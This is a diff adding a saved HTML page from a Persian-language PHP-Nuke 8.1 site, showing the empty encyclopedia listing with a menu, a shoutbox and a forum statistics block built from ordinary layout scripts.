@@ -1,0 +1,448 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>نيوك ويرايش 8.1 - فرهنگ نامه</title>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
+<META HTTP-EQUIV="EXPIRES" CONTENT="0">
+<META NAME="RESOURCE-TYPE" CONTENT="DOCUMENT">
+<META NAME="DISTRIBUTION" CONTENT="GLOBAL">
+<META NAME="AUTHOR" CONTENT="نيوك ويرايش 8.1">
+<META NAME="COPYRIGHT" CONTENT="Copyright (c) by نيوك ويرايش 8.1">
+<META NAME="KEYWORDS" CONTENT="PHPNUKE, Phpnuke.ir, PHPNUKE.IR, phpnuke.ir, Mashhadteam, MASHHADTEAM, mashhadteam">
+<META NAME="DESCRIPTION" CONTENT="نيوك فارسي">
+<META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
+<META NAME="REVISIT-AFTER" CONTENT="1 DAYS">
+<META NAME="RATING" CONTENT="GENERAL">
+<SCRIPT src="includes/editor/farsi.js" type=text/javascript></SCRIPT>
+<script type='text/javascript' src='includes/editor/scripts/wysiwyg.js'></script>
+<script type='text/javascript' src='includes/editor/scripts/wysiwyg-settings.js'></script><script type="text/javascript">
+<!--
+function openwindow(){
+	window.open ("modules/Encyclopedia/copyright.php","Copyright","toolbar=no,location=no,directories=no,status=no,scrollbars=yes,resizable=no,copyhistory=no,width=400,height=200");
+}
+//-->
+</SCRIPT>
+
+<SCRIPT LANGUAGE="javascript" SRC="images/links/inc/fading.js">
+</SCRIPT>
+</script>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="backend.php">
+<LINK REL="StyleSheet" HREF="themes/MashhadTeam-lightblue/style/style.css" TYPE="text/css">
+
+
+<Script  src="includes/preloader.js" TYPE="text/javascript"></script>
+
+
+
+</head>
+
+<DIV id="waitDiv" style="LEFT: 40%; VISIBILITY: hidden; POSITION: absolute; TOP: 50%; TEXT-ALIGN: center">
+          <TABLE cellPadding="6" border="0">
+            <TBODY>
+               <TR>
+                  <TD align="middle"><B>
+                                  <BR><IMG src="images/p.gif" ><BR><B>
+            <FONT color="#0000000" face="Tahoma" size="1" dir="ltr"></FONT></B></TD></TR></TBODY></TABLE></DIV>
+       <SCRIPT>showWaitm('waitDiv', 1);</SCRIPT>
+       </DIV><body dir="rtl" topmargin="0" leftmargin="0" bgcolor="#ffffff" text="#666666" link="#363636" vlink="#363636" alink="#d5ae83">
+
+
+<div align="center">
+    <table border="0" bgcolor="#ffffff" width="99%" dir="rtl" cellspacing="0" cellpadding="0">
+    <tr>
+    <td background="themes/MashhadTeam-lightblue/images/Page_rast.gif" width="4">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Page_rast.gif" width="4" height="1"></td>
+    <td>
+    <div align="center">
+    <table border="0" width="100%" cellspacing="0" cellpadding="0" dir="rtl">
+    <tr>
+    <td style="background-image: url('themes/MashhadTeam-lightblue/images/Header_bg.gif'); background-repeat: repeat-x; background-position: center top" align="left">
+    <!--Header Image-->
+    <img border="0" src="themes/MashhadTeam-lightblue/images/logo.gif">
+    <!---------------->
+    </td>
+    </tr>
+    <tr>
+    <td>
+    <table border="0" width="100%" cellspacing="0" cellpadding="0">
+    <tr>
+    <td width="5">&nbsp;</td>
+    <td>
+    <table border="0" width="100%" cellspacing="0" cellpadding="0">
+    <tr>
+    <td>
+    <table id="Menu" border="0" width="100%" cellspacing="0" cellpadding="0">
+    <tr>
+    <td width="9">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_bala_rast.gif" width="9" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" align="center">
+    &nbsp;</td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="2">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_menu_break.gif" width="2" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="125" align="center">
+    <a href="index.html">صفحه اصلی</a></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="2">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_menu_break.gif" width="2" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="125" align="center">
+    <a href="search.html">جستجو</a></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="2">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_menu_break.gif" width="2" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" align="center" width="125">
+    <a href="downloads.html">دریافت فایل</a></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="2">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_menu_break.gif" width="2" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" align="center" width="125">
+    <a href="modules.php?name=Your_Account">تنظیمات کاربری</a></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" width="2">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_menu_break.gif" width="2" height="41"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_bala_vasat.gif" align="center">
+    &nbsp;</td>
+    <td width="9">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_bala_chap.gif" width="9" height="41"></td>
+    </tr>
+    </table>
+    </td>
+    </tr>
+    <tr>
+    <td>
+    <table border="0" width="100%" cellspacing="0" cellpadding="0">
+    <tr>
+    <td width="9">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_paeyn_rast.gif" width="9" height="25"></td>
+    <td background="themes/MashhadTeam-lightblue/images/Headline_paeyn_vasat.gif">
+    <table width="100%">
+    <tr>
+    <td width="230">&nbsp;&nbsp;کاربر مهمان، خوش آمديد!&nbsp;&nbsp;(&nbsp;<a href="modules.php?name=Your_Account">ورود</a>&nbsp;-&nbsp;<a href="modules.php?name=Your_Account&op=new_user">عضويت</a>&nbsp;)</td>
+    <td>&nbsp;</td>
+    <td width="140">امروز 19 شهريور ماه ، 1392</td>
+    </tr>
+    </table>
+    </td>
+    <td width="9">
+    <img border="0" src="themes/MashhadTeam-lightblue/images/Headline_paeyn_chap.gif" width="9" height="25"></td>
+    </tr>
+    </table>
+    </td>
+    </tr>
+    </table>
+    </td>
+    <td width="5">&nbsp;</td>
+    </tr>
+    </table>
+    </td>
+    </tr>
+    <tr>
+    <td valign="top">
+    <table border="0" width="100%" cellpadding="3">
+    <tr>
+    <td width="180" valign="top"><table border="0" width="180" cellspacing="0" cellpadding="0">
+  <tr>
+  <td background="themes/MashhadTeam-lightblue/images/Table_title_bg.gif">
+  <table border="0" width="100%" cellspacing="0" cellpadding="4">
+  <tr>
+  <td width="15">
+  <img border="0" src="themes/MashhadTeam-lightblue/images/Table_title_rast.gif" width="15" height="15"></td>
+  <td><span class="TableTitle">منوی اصلی</span></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  <tr>
+  <td style="border: 1px solid #BDBDBD">
+  <table border="0" width="100%">
+  <tr>
+  <td><script language="JavaScript1.2">
+<!--
+/*
+Image Preloader-
+© 2002-2004 Telli (www.codezwiz.com)
+Visit http://codezwiz.com/
+*/
+newimage0 = new Image();
+newimage0.src = "images/CZModules/closed.gif";
+newimage1 = new Image();
+newimage1.src = "images/CZModules/open.gif";
+newimage2 = new Image();
+newimage2.src = "images/CZModules/arrow.gif";
+
+/*
+Toggle Menu-
+© 2002-2004 Telli (www.codezwiz.com)
+Visit http://codezwiz.com/
+*/
+function Toggle(item) {
+   obj=document.getElementById(item);
+   visible=(obj.style.display!="none")
+   key=document.getElementById("x" + item);
+   if (visible) {
+     obj.style.display="none";
+     key.innerHTML="<img src='images/CZModules/closed.gif' align='absmiddle' border='0'>";
+   } else {
+      obj.style.display="block";
+     key.innerHTML="<img src='images/CZModules/open.gif' align='absmiddle' border='0'>";
+   }
+}
+//-->
+</script>
+<table border=0 cellpadding='2' cellspacing=0><tr><td>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xلینکهای سریع" href="javascript:Toggle('لینکهای سریع');">
+<img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>لینکهای سریع</b></table>
+<div id="لینکهای سریع" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="index.html" title="صفحه اول" onMouseOver="self.status=' صفحه اول ';return true" onmouseout="self.status='';return true">صفحه اول</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><script language="JavaScript1.2">
+    <!--
+    if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
+    var url="http://www.siteshoma.com";
+    var title="نيوك ويرايش 8.1 | نيوك فارسي";
+    document.write('<A HREF="javascript:window.ext');
+    document.write('ernal.AddFavorite(url,title);" ');
+    document.write('onMouseOver=" window.status=');
+    document.write("' افزودن به ليست '; return true ");
+    document.write('"onMouseOut=" window.status=');
+    document.write("' '; return true ");
+    document.write('">افزودن به ليست</a>');
+  } else {
+    var msg = "افزودن به ليست";
+    document.write(msg);
+  }
+//-->
+</script>
+</td></tr></table></div>
+</div><table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xدیگر بخشها" href="javascript:Toggle('دیگر بخشها');"><img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>دیگر بخشها</b></table>
+<div id="دیگر بخشها" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="modules.php?name=Link_To_Us" title="لینک دوستان" onMouseOver="self.status=' لینک دوستان ';return true" onmouseout="self.status='';return true">لینک دوستان</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="Site_Map.html" title="نقشه سايت" onMouseOver="self.status=' نقشه سايت ';return true" onmouseout="self.status='';return true">نقشه سايت</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="avantgo.html" title="نمايش ساده" onMouseOver="self.status=' نمايش ساده ';return true" onmouseout="self.status='';return true">نمايش ساده</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="stats.html" title="آمار بازدید" onMouseOver="self.status=' آمار بازدید ';return true" onmouseout="self.status='';return true">آمار بازدید</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="modules.php?name=Advertising" title="تبلیغات" onMouseOver="self.status=' تبلیغات ';return true" onmouseout="self.status='';return true">تبلیغات</a></td></tr></table>
+</div><table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xبخش کاربری" href="javascript:Toggle('بخش کاربری');"><img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>بخش کاربری</b></table>
+<div id="بخش کاربری" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="members.html" title="لیست اعضا" onMouseOver="self.status=' لیست اعضا ';return true" onmouseout="self.status='';return true">لیست اعضا</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="journal.html" title="نوشته های روزانه" onMouseOver="self.status=' نوشته های روزانه ';return true" onmouseout="self.status='';return true">نوشته های روزانه</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="modules.php?name=User_Groups" title="گروههای کاربری" onMouseOver="self.status=' گروههای کاربری ';return true" onmouseout="self.status='';return true">گروههای کاربری</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="messages.html" title="پیغام شخصی" onMouseOver="self.status=' پیغام شخصی ';return true" onmouseout="self.status='';return true">پیغام شخصی</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="modules.php?name=Your_Account" title="تنظیمات کاربری" onMouseOver="self.status=' تنظیمات کاربری ';return true" onmouseout="self.status='';return true">تنظیمات کاربری</a></td></tr></table>
+</div><table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xمطالب سایت" href="javascript:Toggle('مطالب سایت');"><img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>مطالب سایت</b></table>
+<div id="مطالب سایت" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="encyclopedia.html" title="فرهنگنامه" onMouseOver="self.status=' فرهنگنامه ';return true" onmouseout="self.status='';return true">فرهنگنامه</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="content.html" title="مقالات سايت" onMouseOver="self.status=' مقالات سايت ';return true" onmouseout="self.status='';return true">مقالات سايت</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="reviews.html" title="نقدنامه" onMouseOver="self.status=' نقدنامه ';return true" onmouseout="self.status='';return true">نقدنامه</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="modules.php?name=Tutorials" title="آموزش ها" onMouseOver="self.status=' آموزش ها ';return true" onmouseout="self.status='';return true">آموزش ها</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="faq.html" title="سئوالات رایج" onMouseOver="self.status=' سئوالات رایج ';return true" onmouseout="self.status='';return true">سئوالات رایج</a></td></tr></table>
+</div><table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xبخش خبری" href="javascript:Toggle('بخش خبری');"><img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>بخش خبری</b></table>
+<div id="بخش خبری" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="topics.html" title="موضوعات اخبار" onMouseOver="self.status=' موضوعات اخبار ';return true" onmouseout="self.status='';return true">موضوعات اخبار</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="archive.html" title="آرشیو اخبار" onMouseOver="self.status=' آرشیو اخبار ';return true" onmouseout="self.status='';return true">آرشیو اخبار</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="submit.html" title="ارسال خبر" onMouseOver="self.status=' ارسال خبر ';return true" onmouseout="self.status='';return true">ارسال خبر</a></td></tr></table>
+</div><table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><a id="xامکانات سایت" href="javascript:Toggle('امکانات سایت');"><img src="images/CZModules/open.gif" align="absmiddle" border="0"></a></td><td><b>امکانات سایت</b></table>
+<div id="امکانات سایت" style="display: show; margin-left: 1em;">
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="recommend.html" title="معرفی به دوستان" onMouseOver="self.status=' معرفی به دوستان ';return true" onmouseout="self.status='';return true">معرفی به دوستان</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="surveys.html" title="نظر سنجی" onMouseOver="self.status=' نظر سنجی ';return true" onmouseout="self.status='';return true">نظر سنجی</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="links.html" title="آدرس سایت ها" onMouseOver="self.status=' آدرس سایت ها ';return true" onmouseout="self.status='';return true">آدرس سایت ها</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="feedback.html" title="ارتباط با سایت" onMouseOver="self.status=' ارتباط با سایت ';return true" onmouseout="self.status='';return true">ارتباط با سایت</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="top.html" title="برترین ها" onMouseOver="self.status=' برترین ها ';return true" onmouseout="self.status='';return true">برترین ها</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="forums.html" title="تالار گفتمان" onMouseOver="self.status=' تالار گفتمان ';return true" onmouseout="self.status='';return true">تالار گفتمان</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="search.html" title="جستجو" onMouseOver="self.status=' جستجو ';return true" onmouseout="self.status='';return true">جستجو</a></td></tr></table>
+<table border=0 cellpadding='1' cellspacing=1><tr><td width='16'><img src="images/CZModules/arrow.gif" align="absmiddle" border="0"></td><td><a href="downloads.html" title="دریافت فایل" onMouseOver="self.status=' دریافت فایل ';return true" onmouseout="self.status='';return true">دریافت فایل</a></td></tr></table>
+</div></td></tr></table></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  </table>
+  <br><script type="text/javascript">
+var SBheight = '150';
+var SBcontent = new String('<table style="table-layout: fixed; width: 100%;" border="0" align="left" cellspacing="0" cellpadding="2"><tr><td align="right"><a title="Free scripts!" target="_blank" href="http://www.ourscripts.net"><span style="font-size: 9;">Shout Box &copy;</span></a></td></tr></table>');
+</script>
+<script type="text/javascript" src="shoutbox.js"></script>
+<table border="0" width="180" cellspacing="0" cellpadding="0">
+  <tr>
+  <td background="themes/MashhadTeam-lightblue/images/Table_title_bg.gif">
+  <table border="0" width="100%" cellspacing="0" cellpadding="4">
+  <tr>
+  <td width="15">
+  <img border="0" src="themes/MashhadTeam-lightblue/images/Table_title_rast.gif" width="15" height="15"></td>
+  <td><span class="TableTitle">پیغام کوتاه</span></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  <tr>
+  <td style="border: 1px solid #BDBDBD">
+  <table border="0" width="100%">
+  <tr>
+  <td><table style="cursor: text;" width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td height="150">
+
+<div align="center"><script type="text/javascript">document.write(SBtxt);</script></div>
+</td></tr></table>
+<form name="shoutform1" method="post" action="" style="margin-bottom: 0px; margin-top: 0px"><table width="100%" border="0" cellspacing="0" cellpadding="1"><tr><td align="center"><a href="modules.php?name=Shout_Box">ارشيو پيغام کوتاه</a>&nbsp;<span style="cursor: hand;" onmouseover="SBspeed=4" onmouseout="SBspeed=1"><img src="modules/Shout_Box/images/up/Black.gif" border="0" alt="" width="9" height="5" /></span>&nbsp;<span style="cursor: hand;" onmouseover="SBspeed=1-5" onmouseout="SBspeed=1"><img src="modules/Shout_Box/images/down/Black.gif" border="0" alt="" width="9" height="5" /></span>&nbsp;<span style="cursor: wait;" onmouseover="SBspeed=0" onmouseout="SBspeed=1"><img src="modules/Shout_Box/images/pause/Black.gif" border="0" alt="" width="9" height="5" /></span></td></tr>
+<tr><td align="center"><inputtype="text" name="shoutuid" size="20" value="نام" maxlength="25" onfocus="if ( this.value == 'نام' ) { this.value=''; }" onblur="if (this.value == '') { this.value='نام' }" /></td></tr>
+<tr><td align="center" nowrap="nowrap"><input onkeypress=FKeyPress(this); onkeydown=FKeyDown(this);  type="text" name="ShoutComment" size="20" value="پيغام" maxlength="2500" onfocus="if ( this.value == 'پيغام' ) { this.value=''; }" onblur="if (this.value == '') { this.value='پيغام' }" /><br><IMG src="images/fa.gif" style="CURSOR: hand" onclick=change(ShoutComment)></td></tr><tr><td align="center"><input type="hidden" name="ShoutSubmit" value="ShoutPost" /><div id="smilies_hide" style="display: block;"><div class="content"><input type="submit" name="button" value="فرستادن" />&nbsp;<span onclick="changeBoxSize ('show'); return false;"><input type="button" value="صورتک ها" /></span></div></div><div id="smilies_show" style="display: none;"><div class="content"><input type="submit" name="button" value="فرستادن" />&nbsp;<span onclick="changeBoxSize ('hide'); return false;"><input type="button" value="صورتک ها" /></span><br /><br /><span style="cursor: hand;" onclick="DoSmilie(' :confused: ','پيغام');"><img src="images/blocks/shout_box/confused.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :sigh: ','پيغام');"><img src="images/blocks/shout_box/sigh.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :sleep: ','پيغام');"><img src="images/blocks/shout_box/sleep.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :upset: ','پيغام');"><img src="images/blocks/shout_box/upset.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :none: ','پيغام');"><img src="images/blocks/shout_box/none.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :eek: ','پيغام');"><img src="images/blocks/shout_box/bigeek.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :rolleyes: ','پيغام');"><img src="images/blocks/shout_box/rolleyes.gif" border="0" alt="" /></span>&nbsp;<br /><br />
+<span style="cursor: hand;" onclick="DoSmilie(' :mad: ','پيغام');"><img src="images/blocks/shout_box/mad.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :yes: ','پيغام');"><img src="images/blocks/shout_box/yes.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :no: ','پيغام');"><img src="images/blocks/shout_box/no.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :shy: ','پيغام');"><img src="images/blocks/shout_box/shy.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :laugh: ','پيغام');"><img src="images/blocks/shout_box/laugh.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :dead: ','پيغام');"><img src="images/blocks/shout_box/dead.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :cry: ','پيغام');"><img src="images/blocks/shout_box/cry.gif" border="0" alt="" /></span>&nbsp;<br /><br />
+<span style="cursor: hand;" onclick="DoSmilie(' :) ','پيغام');"><img src="images/blocks/shout_box/smile.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :( ','پيغام');"><img src="images/blocks/shout_box/sad.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' ;) ','پيغام');"><img src="images/blocks/shout_box/smilewinkgrin.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' B) ','پيغام');"><img src="images/blocks/shout_box/cool.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :D ','پيغام');"><img src="images/blocks/shout_box/biggrin.gif" border="0" alt="" /></span>&nbsp;<span style="cursor: hand;" onclick="DoSmilie(' :P ','پيغام');"><img src="images/blocks/shout_box/bigrazz.gif" border="0" alt="" /></span>&nbsp;</div></div></td></tr>
+</table></form>
+
+</td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  </table>
+  <br>
+<table border="0" width="180" cellspacing="0" cellpadding="0">
+  <tr>
+  <td background="themes/MashhadTeam-lightblue/images/Table_title_bg.gif">
+  <table border="0" width="100%" cellspacing="0" cellpadding="4">
+  <tr>
+  <td width="15">
+  <img border="0" src="themes/MashhadTeam-lightblue/images/Table_title_rast.gif" width="15" height="15"></td>
+  <td><span class="TableTitle">آخرین ارسالها</span></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  <tr>
+  <td style="border: 1px solid #BDBDBD">
+  <table border="0" width="100%">
+  <tr>
+  <td><table class="row1" cellspacing="0" cellpadding="3" width="100%">
+
+ <tr>
+
+  <td align="right" class="row1" width="50%"><font class="tiny">کل موضوعات</font></td>
+
+  <td align="right" class="row1" width="50%">0</td>
+
+ </tr>
+
+ <tr>
+
+  <td align="right" class="row1" width="50%"><font class="tiny">کل ارسال ها</font></td>
+
+  <td align="right" class="row1" width="50%">0</td>
+
+ </tr>
+
+ <tr>
+
+  <td align="right" class="row1" width="50%"><font class="tiny">کل بازديد ها</font></td>
+
+  <td align="right" class="row1" width="50%">0</td>
+
+ </tr>
+
+ <tr>
+
+  <td align="right" class="row1" width="50%"><font class="tiny">کل پاسخ ها</font></td>
+
+  <td align="right" class="row1" width="50%">0</td>
+
+ </tr>
+
+ <tr>
+
+  <td align="right" class="row1" width="50%"><font class="tiny"><a href="modules.php?name=Members_List">کل اعضا</a></font></td>
+
+  <td align="right" class="row1" width="50%">2</td>
+
+ </tr>
+
+</table><table class="row1" cellspacing="0" cellpadding="3" width="100%">
+
+ <tr>
+
+  <td class="row1" width="100%"> <MARQUEE id="mashhadteam" onmouseover="this.stop()" onmouseout="this.start()" trueSpeed scrollAmount="2" direction="up" height="220" align="center"><center> <STYLE="text-decoration: none"><font class="content">آخرين 20 ارسال انجمن</center><br></marquee></td></tr></table>						<center>						<img border="0" src="images/Blackdown.gif" style="cursor: hand;" onmouseover="mashhadteam.scrollDelay=25; mashhadteam.direction = 'Down'; mashhadteam.start();" onmouseout="mashhadteam.scrollDelay=85">						</img>					<img border="0" src="images/Blackpause.gif" style="cursor: hand;" onmouseover="mashhadteam.stop()">						</img>						<img border="0" src="images/Blackup.gif" style="cursor: hand;" onmouseover="mashhadteam.scrollDelay=25; mashhadteam.direction = 'up'; mashhadteam.start();" onmouseout="mashhadteam.scrollDelay=85">						</img></center>      <table class="row1" cellspacing="0" cellpadding="3" width="100%">
+
+ <tr>
+
+  <td align="center" class="row1" width="50%"><a href="modules.php?name=Forums">تالار گفتمان</a></td>
+
+  <td align="center" class="row1" width="50%"><a href="modules.php?name=Forums&file=search">جستجو</a></td>
+
+ </tr>
+
+<tr>
+
+
+
+ </tr>
+
+</table></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  </table>
+  <br></td><td valign="top"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+  <td background="themes/MashhadTeam-lightblue/images/Table_title_bg.gif">
+  <table border="0" width="100%" cellspacing="0" cellpadding="4">
+  <tr>
+  <td>&nbsp;</td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  <tr>
+  <td style="border: 1px solid #BDBDBD">
+  <table border="0" width="100%">
+  <tr>
+  <td><center><span class="title"><strong>نيوك ويرايش 8.1: فرهنگ نامه</strong></span></center></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  </table><br><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+  <td background="themes/MashhadTeam-lightblue/images/Table_title_bg.gif">
+  <table border="0" width="100%" cellspacing="0" cellpadding="4">
+  <tr>
+  <td>&nbsp;</td>
+  </tr>
+  </table>
+  </td>
+  </tr>
+  <tr>
+  <td style="border: 1px solid #BDBDBD">
+  <table border="0" width="100%">
+  <tr>
+  <td><center><font class="content">لیست فرهنگ نامه های موجود در سايت  نيوك ويرايش 8.1:</center><br><br><blockquote></blockquote></td>
+  </tr>
+  </table>
+  </td>
+  </tr>
